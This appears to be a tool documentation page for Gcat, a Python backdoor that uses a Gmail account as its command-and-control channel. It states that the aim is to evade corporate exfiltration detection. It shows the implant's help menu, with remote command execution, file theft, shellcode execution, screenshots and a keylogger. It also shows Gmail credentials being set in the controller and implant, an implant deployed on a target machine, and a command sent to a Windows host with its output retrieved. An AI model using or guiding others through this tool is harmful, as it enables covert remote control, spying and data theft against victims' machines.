
Gcat
=======

Website
-------

<https://github.com/byt3bl33d3r/gcat>

Description
-----------

I'm sure we're all aware of the venerable netcat.  Gcat is a close cousin
to netcat.  Rather than simply piping communications over plaintext tcp; gcat
communicates using gmail.  The idea here is that many companies might detect
suspicious data exfiltration.  Or might block direct communications out. 
But if these companies allow their users to access gmail, we can pipe out
through that.


Install Location
----------------

`/opt/gcat/`

Usage
-----

To run the script, first cd to the gcat directory.

`~$` **`cd /opt/gcat`**

And run the application

`/opt/gcat$` **`python ./gcat.py`**

This will show you the help dialog.

		
															dP   
													88   
						.d8888b. .d8888b. .d8888b. d8888P 
						88'  `88 88'  `"" 88'  `88   88   
						88.  .88 88.  ... 88.  .88   88   
						`8888P88 `88888P' `88888P8   dP   
							.88                          
						d8888P  
		
		
						.__....._             _.....__,
							.": o :':         ;': o :".
							`. `-' .'.       .'. `-' .'   
							`---'             `---'  
		
					_...----...      ...   ...      ...----..._
				.-'__..-''----    `.  `"`  .'    ----'''-..__`-.
				'.-'   _.--'''       `-._.-'       ''''--._   `-.`
				'  .-"'                  :                  `"-.  `
				'   `.              _.'"'._              .'   `
						`.       ,.-'"       "'-.,       .'
						`.                           .'
					jgs    `-._                   _.-'
								`"'--...___...--'"`
		
							...IM IN YUR COMPUTERZ...
		
								WATCHIN YUR SCREENZ
		
		optional arguments:
		-h, --help            show this help message and exit
		-v, --version         show program's version number and exit
		-id ID                Client to target
		-jobid JOBID          Job id to retrieve
		
		-list                 List available clients
		-info                 Retrieve info on specified client
		
		Commands:
		Commands to execute on an implant
		
		-cmd CMD              Execute a system command
		-download PATH        Download a file from a clients system
		-upload SRC DST       Upload a file to the clients system
		-exec-shellcode FILE  Execute supplied shellcode on a client
		-screenshot           Take a screenshot
		-lock-screen          Lock the clients screen
		-force-checkin        Force a check in
		-start-keylogger      Start keylogger
		-stop-keylogger       Stop keylogger
		
		Meow!
		




Gcat works in two parts.		

Example 1: Deploying an Implant
-------------------------------

Configuring gcat and its implant is quite simple.  You need to have a
gmail account that you plan to use.  Then simply pop the username and
password into the two scripts gcat.py and implant.py as the "gmail_user"
and "gmail_pwd" variables.  

		#########################################
		gmail_user = 'gcat.is.the.shit@gmail.com'
		gmail_pwd = 'veryc00lp@ssw0rd'
		server = 'smtp.gmail.com'
		server_port = 587
		#########################################

After you have set both gcat.py and implant.py to be properly configured
you can then run the implant on a target machine.

It's just a simple python script.

Example 2: Running a Command & Retrieving Output
------------------------------------------------

Once you have an implant or two running you can control them from gcat.py.
To start we will want to get the list of all attached implants and their ids.
To do this run gcat.py with the -list option.

`/opt/gcat$` **`python ./gcat.py -list`**

		f964f907-dfcb-52ec-a993-543f6efc9e13 Windows-8-6.2.9200-x86
		90b2cd83-cb36-52de-84ee-99db6ff41a11 Windows-XP-5.1.2600-SP3-x86

Now that we've got a list of attached implants, let's send a command to one.

`/opt/gcat$` **`python ./gcat.py -id 90b2cd83-cb36-52de-84ee-99db6ff41a11 -cmd 'ipconfig /all'`**

		[*] Command sent successfully with jobid: SH3C4gv

Outstanding.  As you can see, we had to specify the id in conjunction with 
the issuance of our command.  This might seem weird to you.  It certainly is
different from traditional netcat.  But think of the id as something akin
to the traditional host.

We do need to send another request in order to retrieve the output from
the command.  That's what the job id is for.

`/opt/gcat$` **`python ./gcat.py -id 90b2cd83-cb36-52de-84ee-99db6ff41a11 -jobid SH3C4gv`**

		DATE: 'Tue, 09 Jun 2015 06:51:44 -0700 (PDT)'
		JOBID: SH3C4gv
		FG WINDOW: 'Command Prompt - C:\Python27\python.exe implant.py'
		CMD: 'ipconfig /all'
		
		
		Windows IP Configuration
		
				Host Name . . . . . . . . . . . . : unknown-2d44b52
				Primary Dns Suffix  . . . . . . . : 
				Node Type . . . . . . . . . . . . : Unknown
				IP Routing Enabled. . . . . . . . : No
				WINS Proxy Enabled. . . . . . . . : No
		
		-- SNIP -

There you go.  That's the basic usage of Gcat.
